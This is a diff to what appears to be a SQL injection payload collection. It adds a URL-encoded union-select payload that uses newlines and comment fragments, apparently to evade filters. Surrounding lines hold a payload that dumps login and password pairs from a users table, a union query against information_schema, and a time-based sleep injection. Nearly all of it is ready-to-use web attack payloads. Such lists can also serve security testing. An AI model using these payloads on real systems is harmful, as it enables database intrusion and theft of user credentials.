@@ -359,6 +359,9 @@ true is not unknown for update union select table_name from information_schema.t
 
 -1 union select listagg(login || ':' || pass,', ') within group (order by login) from users;
 
+#ht ivan
+users.id%0D%0A%23asd%0D%0Aunion%0D%0A%23asd%0D%0Aselect%0D%0A%23asd%0D%0A--a-%0D%0A%23aaa%0D%0Aaa+%0D%0A%23asd%0D%0A--a-%0D%0A%23aaa%0D%0Afrom%0D%0A%23asd%0D%0A--a-%0D%0A%23aaa%0D%0Aasdasd
+
 # http://samincube.blogspot.ru/2013/06/time-based-sqli-on-google-coupon.html
 1'=sleep(1)='1
 
